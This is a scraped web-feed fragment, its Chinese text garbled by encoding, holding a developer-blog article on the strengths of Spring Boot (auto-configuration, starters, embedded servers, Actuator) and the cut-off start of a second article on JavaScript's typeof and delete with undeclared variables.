.highlight{margin-bottom:16px}.markdown-body .highlight pre{margin-bottom:0;word-break:normal}.markdown-body .highlight pre,.markdown-body pre{padding:16px;overflow:auto;font-size:85%;line-height:1.45;background-color:#f6f8fa;border-radius:3px}.markdown-body pre code{display:inline;max-width:auto;padding:0;margin:0;overflow:visible;line-height:inherit;word-wrap:normal;background-color:initial;border:0}.markdown-body .commit-tease-sha{display:inline-block;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:90%;color:#444d56}.markdown-body .full-commit .btn-outline:not(:disabled):hover{color:#005cc5;border-color:#005cc5}.markdown-body .blob-wrapper{overflow-x:auto;overflow-y:hidden}.markdown-body .blob-wrapper-embedded{max-height:240px;overflow-y:auto}.markdown-body .blob-num{width:1%;min-width:50px;padding-right:10px;padding-left:10px;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;line-height:20px;color:rgba(27,31,35,.3);text-align:right;white-space:nowrap;vertical-align:top;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-body .blob-num:hover{color:rgba(27,31,35,.6)}.markdown-body .blob-num:before{content:attr(data-line-number)}.markdown-body .blob-code{position:relative;padding-right:10px;padding-left:10px;line-height:20px;vertical-align:top}.markdown-body .blob-code-inner{overflow:visible;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;color:#24292e;word-wrap:normal;white-space:pre}.markdown-body .pl-token.active,.markdown-body .pl-token:hover{cursor:pointer;background:#ffea7f}.markdown-body .tab-size[data-tab-size="1"]{-moz-tab-size:1;tab-size:1}.markdown-body .tab-size[data-tab-size="2"]{-moz-tab-size:2;tab-size:2}.markdown-body .tab-size[data-tab-size="3"]{-moz-tab-size:3;tab-size:3}.markdown-body .tab-size[data-tab-size="4"]{-moz-tab-size:4;tab-size:4}.markdown-body .tab-size[data-tab-size="5"]{-moz-tab-size:5;tab-size:5}.markdown-body .tab-size[data-tab-size="6"]{-moz-tab-size:6;tab-size:6}.markdown-body .tab-size[data-tab-size="7"]{-moz-tab-size:7;tab-size:7}.markdown-body .tab-size[data-tab-size="8"]{-moz-tab-size:8;tab-size:8}.markdown-body .tab-size[data-tab-size="9"]{-moz-tab-size:9;tab-size:9}.markdown-body .tab-size[data-tab-size="10"]{-moz-tab-size:10;tab-size:10}.markdown-body .tab-size[data-tab-size="11"]{-moz-tab-size:11;tab-size:11}.markdown-body .tab-size[data-tab-size="12"]{-moz-tab-size:12;tab-size:12}.markdown-body .task-list-item{list-style-type:none}.markdown-body .task-list-item+.task-list-item{margin-top:3px}.markdown-body .task-list-item input{margin:0 .2em .25em -1.6em;vertical-align:middle}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><blockquote>
<p>æˆ‘ä»¬æ€»åœ¨å¯»æ‰¾æ·å¾„ã€‚</p>
<p>ä»å‰å†™ç¨‹åºï¼Œåƒæ¨ä¸€è¾†æ²¡è½®å­çš„è½¦ï¼Œèµ°ä¸‰æ­¥ï¼Œåœä¸¤æ­¥ï¼Œä¸æ˜¯ç¼ºä¸ªèºä¸ï¼Œå°±æ˜¯å°‘æ ¹è½´ã€‚é…æ–‡ä»¶æ¯”å†™ä¸šåŠ¡è¿˜é•¿ï¼Œå¼•ä¾èµ–åƒåœ¨é›·åŒºé‡Œèµ°è·¯ï¼Œä¸€ä¸å°å¿ƒå°±ç‚¸äº†ç‰ˆæœ¬ã€‚</p>
<p>åæ¥æ¥äº†ä¸ªå« Spring Boot çš„å®¶ä¼™ã€‚</p>
</blockquote>
<h2 data-id="heading-0">â€”â€” ä»â€œä¼šç”¨â€åˆ°â€œçœŸæ‡‚â€çš„ä¸€æ¬¡å½»åº•æ¢³ç†</h2>
<p>ä½ æ˜¯ä¸æ˜¯ä¹Ÿè¿™æ ·ï¼Ÿ</p>
<ul>
<li>
<p>èƒ½ç”¨ Spring Boot å¿«é€Ÿæ­ä¸ª REST APIï¼›</p>
</li>
<li>
<p>çŸ¥é“å®ƒæœ‰â€œè‡ªåŠ¨è£…é…â€ã€â€œèµ·æ­¥ä¾èµ–â€ã€â€œå†…åµŒ Tomcatâ€ï¼›</p>
</li>
<li>
<p>ä½†å½“åˆ«äººé—®ï¼šâ€œSpring Boot åˆ°åº•å¼ºåœ¨å“ªå„¿ï¼Ÿâ€</p>
<p>æˆ‘..å¥½åƒä»æ²¡æœ‰ä»”ç»†æƒ³è¿‡ï¼Œä½†æ˜¯æˆ‘å¾ˆå–œæ¬¢ä¸€å¥è¯ï¼Œå®ƒèƒ½å¤Ÿç»™å‡ºåˆç†è§£é‡Šï¼š<strong>çº¦å®šå¤§äºé…ç½®</strong>ï¼Œä½ åªéœ€è¦èšç„¦ä¸šåŠ¡çš„å¤„ç†ï¼Œè€Œä¸ç”¨å…³å¿ƒä½¿ç”¨çš„æ˜¯ä»€ä¹ˆå·¥å…·ï¼Œå› ä¸ºæˆ‘ä¼šä¸ºä½ æä¾›é»˜è®¤çš„ï¼Œå°±åƒæˆ‘éœ€è¦åˆ‡èœï¼Œä½¿ç”¨æ°´æœåˆ€ã€èœåˆ€ã€å‰ªåˆ€...ä¸åŒé¢œè‰²ç§ç±»ï¼Œå› ä¸ºå¤§éƒ¨åˆ†äººéƒ½ä¼šä½¿ç”¨èœåˆ€ï¼Œæ‰€ä»¥é»˜è®¤ç»™ä½ çš„å°±æ˜¯èœåˆ€ï¼Œå¦‚æœä½ æƒ³è¦è¯•è¯•å‰ªåˆ€ï¼Œåªéœ€è¦æ›´æ”¹é…ç½®ï¼Œè€Œä¸æ˜¯æ›´æ”¹ä»£ç ã€‚</p>
</li>
</ul>
<p>ä»Šå¤©ï¼Œæˆ‘ä»¬å°±æŠ›å¼€æœ¯è¯­å †ç Œï¼Œä»<strong>çœŸå®å¼€å‘åœºæ™¯å‡ºå‘</strong>ï¼Œå½»åº•ææ¸…æ¥šï¼š<strong>Spring Boot ä¸ºä»€ä¹ˆèƒ½æˆä¸ºç°ä»£ Java å¼€å‘çš„äº‹å®æ ‡å‡†ï¼Ÿ</strong></p>
<hr/>
<h2 data-id="heading-1">ä¸€ã€å®ƒä¸æ˜¯æ–°æ¡†æ¶ï¼Œè€Œæ˜¯â€œæœ€ä½³å®è·µçš„é›†æˆåŒ…â€</h2>
<p>å¾ˆå¤šäººè¯¯ä»¥ä¸º Spring Boot æ˜¯ Spring çš„æ›¿ä»£å“ã€‚å…¶å®æ°æ°ç›¸åâ€”â€”<br/>
<strong>å®ƒæ˜¯ Spring çš„â€œå¼€å‘è€…ä½“éªŒä¼˜åŒ–ç‰ˆâ€</strong>ã€‚</p>
<p>è¿‡å»ç”¨ Spring MVC + MyBatis + Tomcatï¼Œä½ è¦ï¼š</p>
<ul>
<li>é… <code>web.xml</code></li>
<li>å†™æ•°æ®æºé…ç½®</li>
<li>å¼•ä¸€å †ç‰ˆæœ¬å¯èƒ½å†²çªçš„ jar åŒ…</li>
<li>æ‰‹åŠ¨éƒ¨ç½² WAR åˆ°å¤–éƒ¨æœåŠ¡å™¨</li>
</ul>
<p>è€Œ <strong>Spring Boot</strong>çš„å‡ºç°ï¼Œå‘Šè¯‰ä½ ï¼šâ€œä½ åªéœ€è¦å…³å¿ƒä¸šåŠ¡çš„é€»è¾‘ï¼Œé…ç½®å°±è®©æˆ‘æ¥å§â€ã€‚</p>
<hr/>
<h2 data-id="heading-2">äºŒã€äº”å¤§æ ¸å¿ƒæœºåˆ¶ï¼šè®©å¼€å‘â€œå°‘å†™ã€å°‘é…ã€å°‘é”™â€</h2>
<h3 data-id="heading-3">1. <strong>çº¦å®šå¤§äºé…ç½®ï¼ˆConvention over Configurationï¼‰</strong></h3>
<blockquote>
<p>â€œå¦‚æœä½ ä¸ç‰¹åˆ«è¯´æ˜ï¼Œæˆ‘å°±æŒ‰æœ€åˆç†çš„æ–¹å¼åŠã€‚â€</p>
</blockquote>
<ul>
<li>ä¸»ç±»æ”¾ <code>src/main/java</code>ï¼Ÿâ†’ è‡ªåŠ¨æ‰«æåŒåŒ…åŠå­åŒ…çš„ç»„ä»¶ã€‚</li>
<li>é…ç½®æ–‡ä»¶å« <code>application.yml</code>ï¼Ÿâ†’ è‡ªåŠ¨åŠ è½½ã€‚</li>
<li>ç”¨äº† <code>@RestController</code>ï¼Ÿâ†’ è‡ªåŠ¨æ³¨å†Œä¸º Web æ¥å£ã€‚</li>
</ul>
<p><strong>ç»“æœ</strong>ï¼š90% çš„å¸¸è§„é¡¹ç›®ï¼Œé›¶é…ç½®å°±èƒ½è·‘èµ·æ¥ã€‚</p>
<blockquote>
<p><strong>æ·±å±‚ä»·å€¼</strong>ï¼šçœä¸‹çš„ä¸æ˜¯å‡ è¡Œä»£ç ï¼Œè€Œæ˜¯å†³ç­–æˆæœ¬å’Œè®¤çŸ¥è´Ÿæ‹…ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-4">2. <strong>èµ·æ­¥ä¾èµ–ï¼ˆStarter Dependenciesï¼‰</strong></h3>
<p>è¿˜è®°å¾—ä»¥å‰ä¸ºäº†æ•´åˆ Redisï¼Œè¦æŸ¥åŠå¤©è¯¥å¼•å“ªäº›åŒ…å—ï¼Ÿ</p>
<p>ç°åœ¨åªéœ€ä¸€è¡Œï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>è¿™ä¸ª starter å·²ç»åŒ…å«äº†ï¼š</p>
<ul>
<li>Lettuce å®¢æˆ·ç«¯</li>
<li>Spring Data Redis æ”¯æŒ</li>
<li>è¿æ¥æ± é…ç½®</li>
<li>è‡ªåŠ¨åºåˆ—åŒ–å™¨</li>
</ul>
<p><strong>èƒŒåæ˜¯ Spring å›¢é˜Ÿå¸®ä½ åšäº†ä¾èµ–ç‰ˆæœ¬å¯¹é½å’Œç»„åˆæµ‹è¯•ï¼Œå‘Šåˆ«â€œä¾èµ–åœ°ç‹±â€ï¼ŒæŠ€æœ¯æ ˆå¼€ç®±å³ç”¨ã€‚</strong></p>
<hr/>
<h3 data-id="heading-5">3. <strong>å†…åµŒæœåŠ¡å™¨</strong></h3>
<p>ä¼ ç»Ÿ Java Webï¼šWAR â†’ å¤–éƒ¨ Tomcat â†’ å¯åŠ¨æ…¢ã€ç¯å¢ƒä¸ä¸€è‡´ã€‚</p>
<p>Spring Bootï¼š<strong>JAR = åº”ç”¨ + æœåŠ¡å™¨</strong>ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">java -jar myapp.jar
</code></pre>
<p>æœåŠ¡ç§’çº§å¯åŠ¨ï¼Œä¸”è‡ªå¸¦ Tomcat / Jetty / Undertowï¼ˆå¯åˆ‡æ¢ï¼‰ï¼Œå¼€å‘è°ƒè¯•å¿«å¦‚é—ªç”µï¼ŒDocker éƒ¨ç½²ä¸€è¡Œæå®šï¼ŒçœŸæ­£å®ç°â€œä¸€æ¬¡æ„å»ºï¼Œéšå¤„è¿è¡Œâ€ã€‚</p>
<hr/>
<h3 data-id="heading-6">4. <strong>è‡ªåŠ¨è£…é…ï¼ˆAuto-configurationï¼‰</strong></h3>
<p>è¿™æ˜¯ Spring Boot çš„â€œé­”æ³•å¿ƒè„â€ã€‚</p>
<p>å½“ä½ å¼•å…¥ <code>spring-boot-starter-jdbc</code> å¹¶é…ç½®äº†æ•°æ®åº“ URLï¼Œ<br/>
Spring Boot ä¼š<strong>è‡ªåŠ¨</strong>ï¼š</p>
<ul>
<li>åˆ›å»º <code>DataSource</code></li>
<li>é…ç½®äº‹åŠ¡ç®¡ç†å™¨</li>
<li>æ³¨å†Œ JdbcTemplate</li>
</ul>
<p>è¿™ä¸€åˆ‡åŸºäº <strong>æ¡ä»¶è£…é…ï¼ˆConditionalï¼‰</strong>ï¼š</p>
<ul>
<li>å¦‚æœ classpath æœ‰ HikariCP â†’ ç”¨å®ƒåšè¿æ¥æ± </li>
<li>å¦‚æœä½ æ²¡è‡ªå®šä¹‰ DataSource â†’ æˆ‘æ¥åˆ›å»º</li>
<li>å¦‚æœä½ å†™äº† <code>@EnableTransactionManagement</code> â†’ å°±ä¸å†é‡å¤æ³¨å†Œ</li>
</ul>
<blockquote>
<p>æ™ºèƒ½æ¨æ–­ä½ çš„æ„å›¾ï¼Œåªåœ¨å¿…è¦æ—¶è®©ä½ ä»‹å…¥ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-7">5. <strong>è‡ªå®šä¹‰ Starterï¼šæŠŠå›¢é˜Ÿèƒ½åŠ›äº§å“åŒ–</strong></h3>
<p>æƒ³è±¡ä¸€ä¸‹ï¼šå…¬å¸æœ‰ç»Ÿä¸€çš„æ—¥å¿—è§„èŒƒã€è®¤è¯ SDKã€ç›‘æ§åŸ‹ç‚¹ã€‚</p>
<p>ä½ å¯ä»¥å°è£…æˆ <code>company-spring-boot-starter-xxx</code>ï¼Œå…¶ä»–é¡¹ç›®åªéœ€å¼•å…¥ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.yourcompany<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>company-spring-boot-starter-logging<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>ç„¶åâ€”â€”æ—¥å¿—æ ¼å¼è‡ªåŠ¨ç»Ÿä¸€ã€TraceID è‡ªåŠ¨æ³¨å…¥ã€é”™è¯¯ä¸ŠæŠ¥è‡ªåŠ¨å¼€å¯ã€‚</p>
<blockquote>
<p>æƒ³è±¡ä¸€ä¸‹ï¼šæ–°äººä¸Šæ‰‹é›¶æˆæœ¬ï¼Œæ¶æ„æ²»ç†è½åœ°åˆ°æ¯ä¸€è¡Œä»£ç ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-8">ä¸‰ã€è¢«ä½ä¼°çš„â€œéšè—ä¼˜åŠ¿â€ï¼šä¸æ­¢äºå¼€å‘é˜¶æ®µ</h2>
<p>Spring Boot çš„å‰å®³ï¼Œè¿˜ä½“ç°åœ¨<strong>å…¨ç”Ÿå‘½å‘¨æœŸæ”¯æŒ</strong>ï¼š</p>
<h3 data-id="heading-9">ğŸ”¹ <strong>ç»Ÿä¸€é…ç½®ç®¡ç†</strong></h3>
<ul>
<li><code>application-{profile}.yml</code> æŒ‰ç¯å¢ƒéš”ç¦»</li>
<li><code>@ConfigurationProperties</code> ç±»å‹å®‰å…¨ç»‘å®š</li>
<li>æ”¯æŒå‘½ä»¤è¡Œã€ç¯å¢ƒå˜é‡ã€Config Server å¤šç§æ¥æº</li>
</ul>
<h3 data-id="heading-10">ğŸ”¹ <strong>Actuatorï¼šç”Ÿäº§çº§ç›‘æ§å¼€ç®±å³ç”¨</strong></h3>
<ul>
<li><code>/health</code>ï¼šæœåŠ¡æ˜¯å¦å¥åº·ï¼Ÿ</li>
<li><code>/metrics</code>ï¼šQPSã€å†…å­˜ã€GC æƒ…å†µï¼Ÿ</li>
<li><code>/loggers</code>ï¼šçº¿ä¸ŠåŠ¨æ€è°ƒæ—¥å¿—çº§åˆ«ï¼ˆä¸ç”¨é‡å¯ï¼ï¼‰</li>
</ul>
<p>é…åˆ Prometheus + Grafanaï¼Œè¿ç»´ä»æ­¤æœ‰â€œçœ¼ç›â€ã€‚</p>
<h3 data-id="heading-11">ğŸ”¹ <strong>DevToolsï¼šå¼€å‘æ•ˆç‡å€å¢å™¨</strong></h3>
<ul>
<li>ä»£ç ä¿®æ”¹ â†’ è‡ªåŠ¨é‡å¯ï¼ˆç§’çº§ï¼‰</li>
<li>æ¨¡æ¿æ–‡ä»¶ä¿®æ”¹ â†’ å®æ—¶åˆ·æ–°</li>
<li>ç¦ç”¨ç¼“å­˜ + è¯¦ç»†é”™è¯¯é¡µ</li>
</ul>
<p>å‘Šåˆ«â€œæ”¹ä¸€è¡Œ â†’ é‡å¯ 30 ç§’â€çš„ç—›è‹¦å¾ªç¯ã€‚</p>
<h3 data-id="heading-12">ğŸ”¹ <strong>æµ‹è¯•è¶…çº§å‹å¥½</strong></h3>
<ul>
<li><code>@WebMvcTest</code>ï¼šåªæµ‹ Controller</li>
<li><code>@DataJpaTest</code>ï¼šåªæµ‹ Repositoryï¼ˆè‡ªåŠ¨å›æ»šï¼‰</li>
<li>å†…ç½® MockMvcã€TestRestTemplateã€JsonPath</li>
</ul>
<h3 data-id="heading-13">ğŸ”¹ <strong>ä¸ Spring ç”Ÿæ€æ— ç¼èåˆ</strong></h3>
<p>Securityã€Cloudã€Batchã€Kafkaâ€¦â€¦<br/>
åªè¦åŠ ä¸ª starterï¼Œ<strong>é»˜è®¤é…ç½®å·²ä¸ºä½ è°ƒä¼˜</strong>ï¼Œæ— éœ€ç ”ç©¶å¦‚ä½•â€œæ‹¼è£…â€ã€‚</p>
<h3 data-id="heading-14">ğŸ”¹ <strong>æ„å»º &amp; éƒ¨ç½²ç°ä»£åŒ–</strong></h3>
<ul>
<li>Maven/Gradle æ’ä»¶ä¸€é”®æ‰“åŒ…å¯æ‰§è¡Œ JAR</li>
<li>æ”¯æŒåˆ†å±‚ JARï¼ˆLayered JARï¼‰ï¼Œä¼˜åŒ– Docker æ„å»ºç¼“å­˜</li>
<li><code>./mvnw spring-boot:build-image</code> ç›´æ¥ç”Ÿæˆ OCI é•œåƒï¼</li>
</ul>
<hr/>
<h2 data-id="heading-15">ç»“è¯­ï¼š</h2>
<h4 data-id="heading-16">å®ƒè§£å†³çš„ä¸æ˜¯â€œæŠ€æœ¯é—®é¢˜â€ï¼Œè€Œæ˜¯<strong>å¼€å‘è€…çš„ç—›ç‚¹</strong>ï¼š</h4>
<p>ä¸ç”¨çº ç»“é…ç½®çš„é€‰æ‹©ï¼Œå¯æ’æ‹”è®¾è®¡ä¸å†é‡å¤é€ è½®å­ï¼Œå›¢é˜Ÿä»£ç è§„èŒƒï¼Œè¿ç»´æˆæœ¬æ›´ä½...ç­‰ç­‰ï¼Œå¹¶ä¸” <strong>å®ƒä¸å¼ºè¿«ä½ ç†è§£æ‰€æœ‰ç»†èŠ‚ï¼Œä½†æ°¸è¿œç»™ä½ æ·±å…¥çš„è‡ªç”±ã€‚</strong></p>
<ul>
<li>ä½ å¯ä»¥åªå†™ Controllerï¼Œäº«å—â€œå¼€ç®±å³ç”¨â€ï¼›</li>
<li>ä¹Ÿå¯ä»¥é€šè¿‡ <code>@Configuration</code>ã€<code>EnvironmentPostProcessor</code>ã€<code>BeanFactoryPostProcessor</code> æ·±åº¦å®šåˆ¶ï¼›</li>
<li>ç”šè‡³å¯ä»¥åŸºäºå®ƒæ„å»ºè‡ªå·±çš„æ¡†æ¶ï¼ˆæ¯”å¦‚å›½å†…å¾ˆå¤šä¸­å° PaaSï¼‰ã€‚</li>
</ul>
<p>è¿™ç§â€œ<strong>ç®€å•è€Œä¸ç®€é™‹ï¼Œå¼ºå¤§è€Œä¸å¤æ‚</strong>â€çš„è®¾è®¡ï¼Œæ‰æ˜¯ Spring Boot åå¹´ä¸è¡°çš„çœŸæ­£åŸå› ã€‚</p>
<hr/>
<h2 data-id="heading-17">å†™åœ¨æœ€å</h2>
<p>â€œSpring Boot å¥½åœ¨å“ªï¼Ÿâ€</p>
<p><strong>// å†™ç»™æ¯ä¸€ä¸ªæ¯å¤©å’Œ <code>@SpringBootApplication</code> æ‰“äº¤é“ï¼Œå´æ€»è§‰å¾—â€œå¥½åƒè¿˜å·®ç‚¹ä»€ä¹ˆâ€çš„ Java å¼€å‘è€…ã€‚</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript ä¸­ä¸ºä½•æœªå®šä¹‰å˜é‡åœ¨ typeof ä¸ delete ä¸­ä¸ä¼šæŠ¥é”™ï¼Ÿâ€”â€”åŸç†ã€ç¤ºä¾‹ä¸æœ€ä½³å®è·µ]]></title>    <link>https://juejin.cn/post/7581727073581383731</link>    <guid>https://juejin.cn/post/7581727073581383731</guid>    <pubDate>2025-12-10T01:54:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581727073581383731" data-draft-id="7581691182004584458" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript ä¸­ä¸ºä½•æœªå®šä¹‰å˜é‡åœ¨ typeof ä¸ delete ä¸­ä¸ä¼šæŠ¥é”™ï¼Ÿâ€”â€”åŸç†ã€ç¤ºä¾‹ä¸æœ€ä½³å®è·µ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-10T01:54:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="excel"/> <meta itemprop="url" content="https://juejin.cn/user/2911162520062862"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript ä¸­ä¸ºä½•æœªå®šä¹‰å˜é‡åœ¨ typeof ä¸ delete ä¸­ä¸ä¼šæŠ¥é”™ï¼Ÿâ€”â€”åŸç†ã€ç¤ºä¾‹ä¸æœ€ä½³å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2911162520062862/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    excel
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T01:54:45.000Z" title="Wed Dec 10 2025 01:54:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">ä¸€ã€èƒŒæ™¯ä¸æ¦‚å¿µ</h3>
<p>åœ¨ JavaScript ä¸­ï¼Œå¦‚æœç›´æ¥è®¿é—®æœªå£°æ˜çš„å˜é‡ï¼Œå¦‚ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">console.<span class="hljs-built_in">log</span>(name);
</code></pre>
<p>ä¼šæŠ›å‡ºï¼š</p>
